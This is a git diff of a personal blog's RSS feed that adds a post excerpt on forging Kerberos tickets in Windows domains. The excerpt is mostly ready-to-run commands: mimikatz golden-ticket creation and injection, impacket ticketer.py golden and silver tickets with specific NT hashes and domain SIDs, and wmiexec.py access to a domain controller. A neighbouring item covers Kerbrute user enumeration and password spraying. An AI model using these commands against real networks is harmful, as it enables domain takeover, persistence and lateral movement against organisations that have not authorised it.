@@ -1,14 +1,34 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Posts on Oulaa的个人博客</title>
+    <title>Posts on Oulaa</title>
     <link>/posts/</link>
-    <description>Recent content in Posts on Oulaa的个人博客</description>
+    <description>Recent content in Posts on Oulaa</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
 </copyright>
-    <lastBuildDate>Sun, 10 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>域中票据的制作</title>
+      <link>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/%E5%9F%9F%E4%B8%AD%E7%A5%A8%E6%8D%AE%E7%9A%84%E5%88%B6%E4%BD%9C/</guid>
+      <description>一、使用mimikatz制作票据 kerberos::purge  kerberos::golden /user:administrator /domain:unicode.org /sid:S-1-5-21-165017151-3123059220-25911706310 /krbtgt:xxx /ticket:admin.tck /ptt  注入票据
+kerberos::tgt admin.tck   注意：拿到票据之后注入内存，使用sc之类的服务的情况下使用主机名即可走域认证，使用IP走ntlm认证。
+ 清除票据
+klist /purge  二、impakect  （1）金票  制作票据：
+python3 ticketer.py -nthash 1caee7a5d22ec1b4a20d1c6d72cdfbf1 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.com.br administrator   -nthash为krbgtg的hash。
+-domain-sid为域SID，即域用户ID减去用户部分。
+ 设置临时环境变量(windows)：
+set KRB5CCNAME=C:\Users\aa\Desktop\剑客\内网渗透\impacket-master\impacket-master\examples  linux:
+export KRB5CCNAME=/pentest/impacket/examples/administrator.ccache  使用黄金票据去访问DC
+python3 wmiexec.py -k -no-pass -dc-ip 192.168.100.242 -debug SV-ERP0001   -dc-ip 为域控的用户名，目标必须是机器名，如果是本地需要配置host。
+  （2）银票  制作银票
+   python ticketer.py -nthash 305914b9bdab214a3cf72a238e8d0463 -domain-sid S-1-5-21-3428754558-1783579842-1599308265 -domain central.</description>
+    </item>
+    
     <item>
       <title>Kerbrute域内用户枚举与密码喷洒</title>
       <link>/posts/kerbrute%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E4%B8%8E%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</link>
